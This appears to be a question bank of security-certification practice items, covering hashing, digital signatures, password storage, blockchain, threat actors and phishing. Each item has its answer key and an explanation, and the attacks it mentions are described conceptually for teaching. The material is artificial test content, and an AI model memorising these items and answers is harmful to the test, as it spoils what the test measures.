    {"type":"mcq","question":"A developer stores a SHA-256 digest of each uploaded contract so the application can later confirm the file has not been altered. A manager asks whether the original contract text can be recovered from the stored digest if the file server is lost. What is the correct response?","difficulty":"Foundational","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"The digest can be reversed with the same algorithm to reproduce the contract","B":"Hashing is one-way — the digest can confirm integrity but cannot reconstruct the file","C":"The digest can be decrypted if the application still holds the hashing key","D":"The contract can be recovered only if the digest was produced with SHA-256 rather than SHA-1"},"answer":"B","explanation":"A cryptographic hash is a one-way function: arbitrary input in, fixed-length digest out, with no operation that runs it backwards. That is exactly why hashing protects INTEGRITY rather than confidentiality — re-hashing the file later and comparing digests proves whether it changed, but the digest is not a copy of the data and is not a backup. A is wrong: same algorithm, same direction, hashing never reverses. C is wrong and is the most common exam trap — hashing takes no key and is not encryption, so there is nothing to 'decrypt'. D is wrong: digest length differs between SHA-1 (160-bit) and SHA-256 (256-bit), but neither is reversible.","source":"curated-lesson-hashing-signatures","addedVersion":"8.8.0","addedDate":"2026-07-29"},
    {"type":"mcq","question":"Alice sends Bob a contract along with a digital signature she generated for it. Bob wants to confirm the contract genuinely came from Alice and was not altered in transit. Which key does Bob use, and what does a successful verification establish?","difficulty":"Exam Level","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"Bob's private key — it establishes that only Bob was able to read the contract","B":"Alice's private key — it establishes that Alice authorised the transfer","C":"Alice's public key — it establishes that the holder of Alice's private key signed this exact content","D":"Bob's public key — it establishes that the contract was encrypted end to end"},"answer":"C","explanation":"Signing and verifying run in the opposite direction to confidentiality. The SIGNER uses their own PRIVATE key; anyone verifying uses the signer's PUBLIC key. A successful verification says two things: the content matches what was signed (integrity) and the signature was produced by the holder of Alice's private key (authentication, and non-repudiation once that key is bound to Alice by a validated certificate). B is wrong because Bob does not possess Alice's private key — it never leaves her control. A and D describe the confidentiality direction, where a sender encrypts with the RECIPIENT'S public key and the recipient decrypts with their own private key. Note also that verification says nothing about secrecy: the contract travelled in the clear unless it was separately encrypted.","source":"curated-lesson-hashing-signatures","addedVersion":"8.8.0","addedDate":"2026-07-29"},
    {"type":"multi-select","question":"(Choose TWO) Which statements about digital signatures are correct?","difficulty":"Hard","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"The signature is normally computed over a hash of the message rather than the entire message","B":"A valid signature prevents unauthorised parties from reading the message contents","C":"A signature supports non-repudiation only while the private key remains under the signer's sole control","D":"Any party holding the signer's public key can generate a new valid signature for that signer","E":"Changing a single character of a signed document leaves the signature valid because the change is trivial"},"answers":["A","C"],"explanation":"A is correct: the signer hashes first and signs the fixed-size digest, which is why signing a 400-page PDF costs no more than signing a paragraph. C is correct and is the condition examiners test — non-repudiation is an assumption about key custody, not a property of the maths. A private key that was shared, stolen, or held in an unprotected store gives the signer a genuine 'it was not me' defence. B is the classic trap: signatures give integrity, authentication and non-repudiation, NOT confidentiality — a signed document is still readable by anyone unless it is also encrypted. D inverts the key roles: the public key only verifies; producing a signature requires the private key. E contradicts the avalanche effect — one changed character produces a completely different digest, so verification fails.","source":"curated-lesson-hashing-signatures","addedVersion":"8.8.0","addedDate":"2026-07-29"},
    {"type":"mcq","question":"A researcher demonstrates that they can produce two different executables — one benign, one containing a backdoor — that both produce the identical MD5 digest. Which attack does this demonstrate, and what is its practical consequence?","difficulty":"Exam Level","topic":"Web & Cryptographic Attacks","objective":"2.4","options":{"A":"A preimage attack — the original input can now be recovered from any MD5 digest","B":"A collision attack — a digest match no longer proves the two files are the same file","C":"A downgrade attack — the verifying system is forced back to a weaker algorithm","D":"A replay attack — a previously captured digest is resubmitted to the verifier"},"answer":"B","explanation":"A collision is two DIFFERENT inputs producing the SAME digest. Collisions exist mathematically for every hash function (infinite inputs, finite outputs); a secure algorithm simply makes finding one computationally impractical. MD5 and SHA-1 no longer meet that bar, which is why both are unsuitable wherever a digest is used as proof of identity for content — integrity verification, digital signatures, and code signing. Practically: the attacker gets the benign build signed or approved, then ships the backdoored build that matches the same digest. A describes a preimage attack (recovering an input from a digest) — a different and still-infeasible property. C and D are real attacks but are unrelated to two inputs sharing a digest.","source":"curated-lesson-hashing-signatures","addedVersion":"8.8.0","addedDate":"2026-07-29"},
    {"type":"mcq","question":"An attacker steals a credential database where each password was hashed with a single pass of SHA-256 and no additional per-user value. Within hours they have recovered thousands of the weaker passwords by looking their digests up in a precomputed table. Which control would have specifically defeated this technique?","difficulty":"Exam Level","topic":"Web & Cryptographic Attacks","objective":"2.4","options":{"A":"Adding a unique random salt to each password before hashing","B":"Increasing the stored digest length from 256 bits to 512 bits","C":"Encrypting the database column that stores the digests with AES-256","D":"Requiring the password to be re-hashed on every successful login"},"answer":"A","explanation":"A precomputed (rainbow) table is built once against a plain 'hash(password)' construction and reused against every victim. A unique per-user salt breaks that economy: the attacker's table now applies to nobody, because each user's digest was computed over password+salt. This is also why identical passwords stop producing identical digests, so the dump no longer reveals which accounts share a password. B is wrong — a longer digest of the same unsalted construction is just as lookup-able, and the entries are already in the tables. C adds a layer but does not address the weakness in the hashing construction, and the attacker who took the dump frequently has the key material too. D changes nothing about the stored value's structure. Note what a salt does NOT do: it does not stop the attacker guessing against each hash individually — that requires a deliberately slow password-hashing algorithm.","source":"curated-lesson-hashing-signatures","addedVersion":"8.8.0","addedDate":"2026-07-29"},
    {"type":"mcq","question":"After a breach, a forensic report notes that the stolen password digests were salted per user but produced by a single unsalted-speed general-purpose hash running on GPU-friendly hardware. The attacker still recovered a large share of the passwords. Which statement BEST explains the outcome?","difficulty":"Hard","topic":"Web & Cryptographic Attacks","objective":"2.4","options":{"A":"The salts must have been stored alongside the digests, which invalidated them","B":"Salting only protects against precomputed tables; a fast hash still allows billions of offline guesses per second against each salted digest","C":"Per-user salts cancel each other out once more than a few thousand accounts are present","D":"The attacker reversed the digests directly because salting removes preimage resistance"},"answer":"B","explanation":"Salting and slowness solve two different problems. The salt defeats PRECOMPUTATION — the attacker cannot reuse a table built in advance. It does nothing to slow down a fresh guess: the attacker takes a candidate password, appends the known salt, hashes, compares, and repeats. On a general-purpose fast hash that loop runs at enormous rates offline, so common and moderately weak passwords fall regardless. The countermeasure is a deliberately expensive algorithm — Argon2id, bcrypt, scrypt, PBKDF2 with a high iteration count — which is engineered to make each guess cost real time and memory. A is wrong and is a frequent misconception: salts are not secrets and are normally stored beside the digest by design. C is invented. D is wrong — salting does not weaken preimage resistance; the attacker guessed forward, they did not reverse anything.","source":"curated-lesson-hashing-signatures","addedVersion":"8.8.0","addedDate":"2026-07-29"},
    {"type":"multi-select","question":"(Choose TWO) Which statements correctly distinguish a collision attack from a preimage attack against a hash function?","difficulty":"Hard","topic":"Web & Cryptographic Attacks","objective":"2.4","options":{"A":"A collision attack finds any two distinct inputs that share a digest","B":"A preimage attack starts from a digest and seeks an input that produces it","C":"A collision attack recovers the original input from a published digest","D":"A preimage attack requires the attacker to control both of the compared inputs","E":"Both attacks are considered practical against SHA-256 today"},"answers":["A","B"],"explanation":"A is the definition of a collision: two different inputs, one shared digest, and the attacker usually gets to craft both — which is why collisions break signing and code-signing workflows where a 'good' artefact is approved and a 'bad' one is substituted. B is the definition of a preimage attack: given only the output, find an input that hashes to it. Second-preimage resistance is the related property — given one specific input, find a different one with the same digest. C swaps the definitions; recovering an input from a digest is preimage, not collision. D describes collision conditions, not preimage. E is wrong: MD5 and SHA-1 are broken for collision resistance, but SHA-2 (including SHA-256) and SHA-3 remain appropriate, and no preimage attack is practical against any of them.","source":"curated-lesson-hashing-signatures","addedVersion":"8.8.0","addedDate":"2026-07-29"},
    {"type":"mcq","question":"A team is designing password storage for a new customer portal. Their proposal is a single pass of SHA-256 with a unique salt per user, justified on the grounds that SHA-256 is a current, unbroken algorithm. What should the security reviewer recommend?","difficulty":"Exam Level","topic":"Identity & Access Management","objective":"4.6","options":{"A":"Approve it, because SHA-256 with a unique salt is the current standard for password storage","B":"Replace SHA-256 with MD5 and a longer salt to reduce processing cost on the login path","C":"Replace the general-purpose hash with a purpose-built password hashing algorithm such as Argon2id, bcrypt, scrypt, or PBKDF2 with a high iteration count","D":"Store the passwords encrypted with AES-256 so they can be recovered for account support"},"answer":"C","explanation":"SHA-256 is entirely appropriate for file integrity and signature digests — its speed is a FEATURE there. That same speed is the flaw for password storage, because the attacker who steals the database attacks it offline at full hardware speed. Purpose-built password hashing algorithms deliberately impose work (iterations, and for Argon2id and scrypt a memory cost that blunts GPU and ASIC advantage), so each guess is expensive while a single legitimate login stays imperceptible. A is the trap this question exists for: 'unbroken algorithm' and 'right tool for password storage' are different claims. B is worse on both counts — MD5 is faster and collision-broken. D is wrong in principle: a system should hold a one-way verifier, not a recoverable password; reversibility is a liability, and legitimate account support uses a reset flow instead.","source":"curated-lesson-hashing-signatures","addedVersion":"8.8.0","addedDate":"2026-07-29"},
    {"type":"mcq","question":"An application adds a single secret value, identical for all accounts, that is combined with every password before hashing. This value is held in the platform's secrets manager rather than in the credential database. Which term describes it, and what does it add over the per-user salt already in use?","difficulty":"Hard","topic":"Identity & Access Management","objective":"4.6","options":{"A":"A pepper — an attacker who exfiltrates only the credential database lacks a value needed to test guesses at all","B":"A second salt — it guarantees that no two users can ever share a digest","C":"A key-stretching factor — it multiplies the iteration count applied to each password","D":"An initialisation vector — it randomises the hash output the same way it randomises block-cipher output"},"answer":"A","explanation":"A pepper is a secret added to the hashing input, typically shared across accounts and deliberately stored SEPARATELY from the password database — a secrets manager, an HSM, or application configuration under different access control. Its value is scoped to one specific scenario, and that scope is what exams test: if the attacker takes only a database dump (a lone SQL injection, a stolen backup), guesses cannot even be tested without the missing secret. If the attacker also reaches the secret store, the pepper contributes nothing further and you are back to the strength of the salt and the algorithm. B misstates it: uniqueness across users is the SALT's job, and the pepper is shared, not unique. C confuses it with iteration count or a KDF work factor — a pepper adds secrecy, not cost per guess. D borrows a term from encryption; an IV belongs to cipher modes, not password hashing.","source":"curated-lesson-hashing-signatures","addedVersion":"8.8.0","addedDate":"2026-07-29"},
    {"type":"mcq","question":"An examiner acquires a bit-for-bit image of a suspect drive, records a SHA-256 digest of the source and of the image at acquisition time, and computes the digest again after completing the analysis. Opposing counsel later challenges the evidence. What do the matching digests establish?","difficulty":"Exam Level","topic":"Forensics & Investigations","objective":"4.9","options":{"A":"That the image was encrypted throughout the examination and could not be read by anyone else","B":"That the image is identical to what was acquired and was not altered during analysis","C":"That the examiner is the only person who had physical custody of the drive","D":"That the data on the drive was created by the suspect"},"answer":"B","explanation":"Hashing at acquisition and re-hashing afterwards is the standard integrity check in evidence handling: identical digests demonstrate the working copy still matches what was seized, so nothing was modified by the examination. That is an INTEGRITY claim only, and knowing its limits is the exam point. A is wrong — hashing is not encryption and provides no confidentiality. C is wrong: custody is proved by the chain-of-custody documentation (who held it, when, and why), which the hash supports but does not replace. D is wrong and is the strongest overreach — a digest says nothing about authorship or intent, only that the bits are unchanged.","source":"curated-lesson-hashing-signatures","addedVersion":"8.8.0","addedDate":"2026-07-29"},
    {"type":"mcq","question":"A company enables DKIM on its outbound mail. A director asks whether this means messages to customers are now protected from being read in transit. What is the accurate answer?","difficulty":"Exam Level","topic":"Email & Web Security","objective":"4.5","options":{"A":"Yes — DKIM encrypts the message body with the domain's private key","B":"No — DKIM signs the message so recipients can verify origin and integrity, but it does not encrypt anything","C":"Yes — DKIM negotiates TLS between mail servers before any message is transmitted","D":"No — DKIM only publishes which servers may send for the domain, and performs no cryptographic operation"},"answer":"B","explanation":"DKIM attaches a signature over selected headers and the message body, generated with the sending domain's private key; the receiver retrieves the matching public key from DNS and verifies. That yields integrity and proof the message came from an authorised sender for that domain — the same three services as any digital signature, minus confidentiality. The body still travels readable to anything on the path unless a separate mechanism protects it (opportunistic TLS between servers for the hop, or S/MIME and PGP for genuine end-to-end encryption). A restates the persistent 'signing is encrypting' error. C describes transport encryption, which is negotiated independently of DKIM. D describes SPF, DKIM's IP-authorisation counterpart, and wrongly denies the signature.","source":"curated-lesson-hashing-signatures","addedVersion":"8.8.0","addedDate":"2026-07-29"},
    {"type":"mcq","question":"An administrator downloads a firmware update and confirms its SHA-256 digest matches the value printed beside the download link on the vendor's website. The digests match. Which residual risk remains, and which control addresses it?","difficulty":"Hard","topic":"Endpoint & Server Hardening","objective":"4.1","options":{"A":"None — a matching digest from the vendor's own site fully establishes authenticity","B":"An attacker who compromised the site could have replaced both the file and the published digest; verifying the vendor's code signature against a validated certificate addresses this","C":"The digest may collide with an unrelated file, so the download should be repeated and re-hashed","D":"SHA-256 cannot detect transmission corruption, so a separate CRC check should also be performed"},"answer":"B","explanation":"The digest and the file came from the SAME source, so the check only proves the download arrived intact from whatever that page was serving — it proves nothing about who put it there. An attacker with write access to the distribution page swaps both, and the comparison passes. A digital signature breaks that circularity: the vendor signs with a private key the compromised web server does not hold, and your system verifies with a public key obtained through a certificate chaining to a trusted root. This is why software and firmware distribution relies on code signing rather than a posted hash. A states the trap directly. C misunderstands collisions — SHA-256 collisions are not findable, and re-downloading recomputes the same digest anyway. D is wrong: a cryptographic hash detects corruption strictly better than a CRC does, so no additional checksum adds anything.","source":"curated-lesson-hashing-signatures","addedVersion":"8.8.0","addedDate":"2026-07-29"},

    {"type":"mcq","question":"Four pharmaceutical companies need a shared record of every custody transfer of a medication batch, from manufacture to pharmacy. No single company is willing to host the authoritative database, and each must be able to detect if another has quietly rewritten an earlier entry. Which solution BEST fits these requirements?","difficulty":"Exam Level","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"A distributed ledger (blockchain) — participants each hold a copy of a hash-linked record, so a rewritten entry is detectable and no single party owns the history","B":"A clustered database with synchronous replication to each company's data centre","C":"A RAID 6 array holding the shared record, replicated nightly to each participant","D":"A central SIEM that ingests custody events from all four companies"},"answer":"A","explanation":"Two requirements point at exactly one answer: no single owner of the record, and tamper-evidence between mutually distrustful parties. A blockchain gives both — the ledger is replicated across participating nodes, each block carries the previous block's hash, and consensus rules decide what gets accepted, so one participant cannot silently rewrite accepted history. B and C both provide availability and redundancy but leave a single administrative authority who can alter data everywhere; replication faithfully copies a tampered record. D centralises evidence in one platform, which is useful for monitoring but does not remove the trust problem — whoever runs the SIEM controls the record. Note that this scenario says nothing about cryptocurrency; the ledger content is custody events.","source":"curated-lesson-blockchain","addedVersion":"8.11.0","addedDate":"2026-07-31"},

    {"type":"mcq","question":"A CISO summarising a blockchain pilot is asked which security property the technology most directly supports. Which answer is correct?","difficulty":"Exam Level","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"Confidentiality — data written to the ledger is encrypted for participants by default","B":"Integrity — hash-linked blocks plus consensus make unauthorised modification of accepted records detectable","C":"Safety — the ledger prevents invalid business transactions from ever being submitted","D":"Confidentiality and integrity equally, because hashing performs both functions"},"answer":"B","explanation":"Blockchain is an integrity technology first. Chained hashes make alteration detectable, digital signatures on transactions add authentication and support non-repudiation, and replication across nodes contributes to availability. Confidentiality is the property it does NOT provide on its own — ledger contents are typically visible to every participant, and on a public chain to everyone. A and D both state the single most common misconception on this objective, and D compounds it by treating hashing as an encryption function; hashing is one-way and produces no recoverable plaintext, so it cannot deliver confidentiality. C overstates the technology: consensus enforces the network's own rules (valid signature, no double spend, correct block format), not the sensibility of the business event.","source":"curated-lesson-blockchain","addedVersion":"8.11.0","addedDate":"2026-07-31"},

    {"type":"mcq","question":"An auditor alters a single payment amount inside block 400 of a 900-block ledger and re-saves that block on the node they control. Other nodes reject the modified chain almost immediately. What mechanism made the change detectable?","difficulty":"Exam Level","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"Each block is encrypted with the network's shared symmetric key, so an edited block fails to decrypt","B":"Every block stores the hash of the preceding block, so changing block 400's contents changes its hash and breaks the reference held by block 401 and every block after it","C":"Each node keeps a write-protected copy of every block, so edits are physically impossible","D":"Nodes compare block file timestamps and reject any block modified after its creation date"},"answer":"B","explanation":"That backward hash reference is what makes it a chain rather than a pile of records. Altering any data in block 400 changes block 400's digest; block 401 still carries the OLD digest as its previous-block value, so the link no longer matches, and the mismatch cascades through every later block. Rebuilding all 500 subsequent blocks and then persuading the network's consensus mechanism to prefer that chain over the accepted one is the real barrier — which is why 'tamper-evident' is the precise description and 'immutable' is loose shorthand. A invents encryption the design does not use. C is wrong — a node operator can edit their own copy freely; the point is that everyone else can tell. D describes filesystem metadata, which an attacker with write access simply sets to whatever they like.","source":"curated-lesson-blockchain","addedVersion":"8.11.0","addedDate":"2026-07-31"},

    {"type":"mcq","question":"A warehouse operator signs and submits a blockchain entry stating that a shipment passed inspection. The inspection never took place. The entry is accepted onto the ledger. What has the blockchain actually established?","difficulty":"Hard","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"That the inspection occurred, because accepted ledger entries are validated as true before acceptance","B":"That a specific private key authorised this exact entry and the entry has not been altered since — it establishes nothing about whether the real-world claim is accurate","C":"Nothing, because a false entry invalidates the surrounding blocks","D":"That the operator was physically present at the warehouse when the entry was submitted"},"answer":"B","explanation":"Consensus checks the network's rules — is the signature valid, is the format correct, does the transaction conflict with existing state — not whether a statement about the physical world is true. A false-but-well-formed entry is accepted and then protected with the same integrity guarantees as a truthful one, which is why this failure is summarised as 'garbage in, immutable garbage out'. Mitigation is a process control: independent attestation, multiple signers, sensor data, or a trusted external data source (an oracle, itself a target worth protecting). A states the misconception directly. C is wrong — a valid entry breaks nothing. D overreaches on what a signature proves: it demonstrates the private key was used, and a stolen key produces an equally valid signature, so the technology cannot bind the action to a specific human being on its own.","source":"curated-lesson-blockchain","addedVersion":"8.11.0","addedDate":"2026-07-31"},
    ...
    {"type":"mcq","question":"Which threat actor category is generally associated with the GREATEST combination of funding, personnel and technical capability?","difficulty":"Foundational","topic":"Threat Actors & Motivations","objective":"2.1","options":{"A":"Hacktivist","B":"Nation-state","C":"Unskilled attacker","D":"Shadow IT"},"answer":"B","explanation":"Nation-state actors sit at the top of the resource ordering: government budgets, full-time offensive teams, intelligence support, custom malware development, purchased zero-days, dedicated infrastructure, and the freedom to run an operation for years. Organized crime is the closest rival and can match them technically, but rarely on sustained intelligence support or on the freedom to run an operation with no revenue deadline. (A) Wrong — hacktivist resourcing is variable and usually modest, drawn from volunteers and commodity tooling. (C) Wrong — unskilled attackers are the low end of the scale by definition. (D) Wrong — Shadow IT is defined by unsanctioned technology, not offensive resourcing; it fields no funding or personnel directed at attacking anyone, so it cannot top a resource ranking. Rough ordering worth carrying: nation-state, then organized crime, then hacktivist, then unskilled — a tendency, not a law.","source":"curated-lesson-threat-actors","addedVersion":"8.14.0","addedDate":"2026-08-22"},
    {"type":"mcq","question":"A criminal gang sends employees phishing emails, harvests credentials from the ones who respond, deploys ransomware across the network, and demands two million pounds. Which option correctly separates the threat actor, the motivation and the threat vector?","difficulty":"Hard","topic":"Threat Actors & Motivations","objective":"2.1","options":{"A":"Actor: ransomware. Motivation: organized crime. Vector: financial gain","B":"Actor: organized crime. Motivation: financial gain. Vector: email (the phishing message)","C":"Actor: phishing email. Motivation: ransomware. Vector: organized crime","D":"Actor: organized crime. Motivation: phishing email. Vector: ransomware"},"answer":"B","explanation":"Three separate questions, deliberately conflated by exam wording. WHO is behind it — a criminal gang, so organized crime. WHY — a payment demand, so financial gain, with an element of blackmail. HOW did they get in — the email carrying the phishing lure, which is the vector. Ransomware is none of the three; it is the attack deployed after entry. (A) Wrong — names the malware as the actor and the actor as the motivation. (C) Wrong — every slot is filled with the wrong category. (D) Wrong — keeps the actor right but swaps motivation and vector, treating the entry method as the reason for the attack. Memory: actor = WHO, motivation = WHY, vector = HOW they got in.","source":"curated-lesson-threat-actors","addedVersion":"8.14.0","addedDate":"2026-08-22"},
    ...
    {"type":"mcq","question":"Two emails arrive at a company on the same morning. The first, sent to thousands of addresses, opens 'Dear customer' and warns that a streaming subscription payment failed. The second, sent only to one engineer, opens with her name, references the build server her team migrated last week, and attaches a 'migration checklist'. Which pairing is correct?","difficulty":"Exam Level","topic":"Social Engineering","objective":"2.2","options":{"A":"First: spear phishing. Second: phishing","B":"Both: spear phishing, since both arrive by email","C":"First: phishing. Second: spear phishing, since only the second knows its recipient","D":"Both: whaling, since a company is targeted"},"answer":"C","explanation":"The discriminator is research. The first message knows nothing about its recipients — a mass blast priced on volume, where the sender does not care that many recipients have no such subscription. The second was built from knowledge of one person and her team's recent work, which is what spear phishing means. (A) Wrong — reversed. (B) Wrong — the channel is shared but the targeting is not, and targeting is the axis the two terms divide. (D) Wrong — whaling requires the target to be a high-value executive; an engineer receiving a targeted message is spear phishing, and 'a company is targeted' describes nearly every workplace attack. Memory: spear = SPECIFIC — the message knows something about you.","source":"curated-lesson-phishing","addedVersion":"8.15.0","addedDate":"2026-08-22"},
    {"type":"mcq","question":"Incident one: a company's CFO receives a personally addressed email referencing her recent earnings call, carrying a malicious 'board minutes' attachment. Incident two: a treasury analyst receives an email that claims to be FROM the CFO, instructing an urgent settlement payment to a new account. Which pairing BEST classifies the two incidents?","difficulty":"Exam Level","topic":"Social Engineering","objective":"2.2","options":{"A":"First: business email compromise. Second: whaling","B":"First: whaling. Second: vishing","C":"First: spear phishing. Second: spear phishing, since both messages are individually targeted","D":"First: whaling. Second: business email compromise"},"answer":"D","explanation":"Ask who the victim is and whose name is on the message. In the first incident the executive RECEIVES the attack — a researched lure aimed at a high-value target, which is whaling. In the second the executive's identity is BORROWED to move money through the person who can authorise it, which is BEC. (A) Wrong — reversed; it assigns each term to the other incident. (B) Wrong — the first half is right, but vishing is the voice channel and incident two is an email. (C) Wrong — both are indeed targeted, but the exam wants the most specific labels: an executive recipient upgrades the first to whaling, and the borrowed identity pushing a payment makes the second BEC. Exam clue: executive as TARGET = whaling; executive as MASK = BEC.","source":"curated-lesson-phishing","addedVersion":"8.15.0","addedDate":"2026-08-22"},
    {"type":"mcq","question":"An attacker phones an employee: 'Hi, this is David from IT. We are migrating everyone to the new MFA platform this afternoon, so I need the six-digit code that just appeared on your phone to carry your account across.' Which element of this attack is the PRETEXT?","difficulty":"Exam Level","topic":"Social Engineering","objective":"2.2","options":{"A":"The fabricated MFA-migration story that makes the request seem routine","B":"The claim to be David from IT","C":"The use of a phone call rather than an email","D":"The six-digit code the attacker is trying to obtain"},"answer":"A","explanation":"Pretexting is the invented scenario — the WHY that makes compliance feel normal. 'We are migrating MFA this afternoon' is that scenario. One call can stack several techniques, and this stem contains four separable elements the exam likes to pull apart. (B) Wrong — claiming to be David from IT is impersonation, the WHO; it answers a different question than the one asked. (C) Wrong — the phone call is the vector, and names the attack vishing; a channel is not a story. (D) Wrong — the code is the objective of the attack, the thing being stolen, not the manipulation used to steal it. Memory: impersonation = WHO you claim to be; pretexting = the STORY you tell.","source":"curated-lesson-phishing","addedVersion":"8.15.0","addedDate":"2026-08-22"},
    {"type":"mcq","question":"An employee receives an email carrying a macro-enabled spreadsheet named 'Headcount-Plan-FY26.xlsm'. Opening it installs a remote-access trojan. A security analyst is asked to name the THREAT VECTOR in this incident. Which answer is correct?","difficulty":"Hard","topic":"Social Engineering","objective":"2.2","options":{"A":"Phishing","B":"The remote-access trojan","C":"The macro-enabled spreadsheet","D":"Email (message-based)"},"answer":"D","explanation":"Vector, technique, delivery mechanism and payload are four different answers hiding in one incident, and the stem asks for the vector — the route into the environment, which is the email message. SY0-701's vector list runs wider than message channels — open service ports, default credentials, unsupported systems and supply chain sit alongside the message-based, image-based, file-based, voice and removable-device routes. (A) Wrong — phishing is the social-engineering TECHNIQUE riding the vector; if the stem asked what kind of attack this is, phishing would be the answer. (B) Wrong — the trojan is the PAYLOAD, what executes after everything else succeeds. (C) Wrong — file-based is a real vector category, but it names files arriving by another route: a shared drive, a download, removable media. This file only ever reached the host inside an email, so the route in was the message. Exam clue: read which layer the question names — vector (route), technique (manipulation), delivery (container), payload (result).","source":"curated-lesson-phishing","addedVersion":"8.15.0","addedDate":"2026-08-22"},
    {"type":"mcq","question":"A conveyancing clerk at a law firm receives an email addressed to her by name, apparently from the senior partner, referencing a genuine property completion scheduled today and instructing that the completion funds go to an updated client account. Which classification MOST SPECIFICALLY describes this attack?","difficulty":"Hard","topic":"Social Engineering","objective":"2.2","options":{"A":"Spear phishing","B":"Business email compromise","C":"Impersonation","D":"Pretexting"},"answer":"B","explanation":"Every option names something genuinely present, which is the trap: the message is targeted (spear phishing), claims a false identity (impersonation), and tells a fabricated story (pretexting). MOST SPECIFICALLY is the operative phrase — BEC is the term that captures the whole shape at once: a trusted business identity used to push a fraudulent payment through the person who can execute it. The general-to-specific ladder runs phishing, spear phishing, BEC. (A) Wrong — true but one rung too general; it describes the targeting without the business-transaction fraud that completes the picture. (C) Wrong — names one component technique inside the attack. (D) Wrong — names another component; the completion-day story is the pretext, not the classification. Exam clue: when several answers are technically present, the exam wants the most specific term that still accounts for the whole scenario.","source":"curated-lesson-phishing","addedVersion":"8.15.0","addedDate":"2026-08-22"},
    {"type":"mcq","question":"Attackers compromise the mailbox of a manufacturer's real steel supplier and read traffic for several weeks. When the supplier emails a genuine invoice for a delivered order, the attackers intercept it and re-send it from the same mailbox with one change: the payment account number. The manufacturer's finance team, replying to a thread they started, pays the attacker's account. Which control would MOST reliably have prevented the loss?","difficulty":"Hard","topic":"Social Engineering","objective":"2.2","options":{"A":"User training on spotting spoofed sender domains and lookalike addresses","B":"An email gateway rule that quarantines any inbound message failing SPF or DKIM authentication checks at the perimeter","C":"A secure email gateway scanning attachments for malware","D":"A standing policy that supplier payment-detail changes are verified by phone on a number already on file"},"answer":"D","explanation":"This BEC variant defeats the usual controls because nothing about the email is fake: real mailbox, real thread, real invoice, authentication checks passing — only the account number changed. The control that reliably still works here is out-of-band verification of the CHANGE, over a channel the attacker does not hold, using contact details that predate the message. (A) Wrong — there is no spoofed domain or lookalike address to spot; the mail genuinely comes from the supplier. (B) Wrong — SPF and DKIM verify the sending infrastructure, and this mail really did leave the supplier's infrastructure, so it passes. (C) Wrong — the invoice is a clean document; the attack is in a number, not a payload. Exam clue: when the compromised party is the SENDER, controls that inspect the email itself have little left to catch — the dependable defences live in the payment process, not the mailbox.","source":"curated-lesson-phishing","addedVersion":"8.15.0","addedDate":"2026-08-22"},
    ...
    {"type":"mcq","question":"A user mistypes a bank's web address and lands on a site at a domain one letter different from the real one. The page she reaches is a faithful copy of the bank's login screen — logo, colours, layout and fonts all match. Which pairing correctly names the two techniques in play?","difficulty":"Exam Level","topic":"Social Engineering","objective":"2.2","options":{"A":"Pharming (the domain) and watering hole (the page)","B":"Typosquatting (the domain) and pharming (the page)","C":"Typosquatting (the domain) and brand impersonation (the page)","D":"Brand impersonation (the domain) and typosquatting (the page)"},"answer":"C","explanation":"Two techniques, one destination. Registering a lookalike domain one keystroke from the real one — caught by mistyping or misread at a glance — is typosquatting. Dressing the page in the bank's visual identity so the arriving victim sees nothing wrong is brand impersonation. They routinely travel together: one supplies the traffic, the other keeps it. (A) Wrong — pharming manipulates name resolution (DNS or hosts file) so a CORRECTLY typed address goes astray; this user mistyped. A watering hole is a genuine site compromised, not a fake one built. (B) Wrong — right about the domain, wrong about the page; no resolution tampering occurred. (D) Wrong — a lookalike domain does carry the brand, but 'typosquatting (the page)' has no meaning: typosquatting is a domain-registration technique, so the second half cannot be right. Memory: typosquatting owns the ADDRESS, brand impersonation owns the LOOK.","source":"curated-lesson-phishing","addedVersion":"8.15.0","addedDate":"2026-08-22"},
    {"type":"mcq","question":"A phishing page collects a victim's username and password, then immediately forwards the browser to the organisation's REAL login page, where the victim signs in successfully on their second attempt. From the attacker's point of view, what is the purpose of that redirect?","difficulty":"Foundational","topic":"Social Engineering","objective":"2.2","options":{"A":"It lets the malicious page bypass the organisation's MFA","B":"The victim concludes they mistyped their password, so the theft goes unreported","C":"It removes the phishing page from the victim's browser history","D":"It transfers the victim's session cookie to the attacker"},"answer":"B","explanation":"The redirect is stagecraft. A failed login followed by a successful one is an everyday experience — the victim shrugs, assumes a typo, and never reports anything. Unreported means unreset: the stolen credentials keep working until something else raises an alarm. (A) Wrong — forwarding a browser does nothing to satisfy or bypass a second factor; MFA-focused phishing takes more machinery than a redirect. (C) Wrong — the victim loaded that page and typed into it, so it is in history; a redirect decides where the browser goes NEXT, not where it has already been. (D) Wrong — this page harvests and forwards; it never sees the legitimate site's cookies, and the victim's real session only begins there AFTER the theft. Capturing a live session cookie takes a proxy sitting in the middle, not a redirect. Exam clue: the redirect buys TIME — suspicion suppressed is a password left unchanged.","source":"curated-lesson-phishing","addedVersion":"8.15.0","addedDate":"2026-08-22"},
    {"type":"mcq","question":"An employee opens an emailed link labelled 'updated holiday policy' and, without entering any credentials, unknowingly downloads a file that encrypts the department's shared drive overnight. The security team classifies the incident as a phishing attack. Why is that classification correct even though no login page was involved?","difficulty":"Foundational","topic":"Social Engineering","objective":"2.2","options":{"A":"Phishing names the deceptive message that induces the action; credential theft is one objective among several","B":"It is not correct — an attack without a fake login page is malvertising, not phishing","C":"Because the user clicked a link, and it is the click that separates phishing from other malware delivery","D":"Because any attack delivered by email is phishing by definition"},"answer":"A","explanation":"Phishing names the deception, not the prize. A fraudulent message engineered a click; what the click delivered — here a ransomware payload — is the objective, and objectives vary: credentials, malware installation, wire transfers, MFA codes, information. (B) Wrong — malvertising plants malicious content in advertising networks; this arrived as a direct message, which is squarely phishing territory. (C) Wrong — the click is how the payload arrives, not what makes this phishing; the deception in the message is. A user clicking a poisoned search result has clicked too, and that is not phishing — and ransomware also arrives with no click at all, through exposed remote access, exploited services and supply chains. (D) Wrong — also an overreach; email carries plenty of non-phishing attacks, and the phishing family reaches past email — its SMS and voice forms simply take their own names, smishing and vishing. Exam clue: phishing = the fraudulent MESSAGE; what it steals or installs is a separate question.","source":"curated-lesson-phishing","addedVersion":"8.15.0","addedDate":"2026-08-22"},
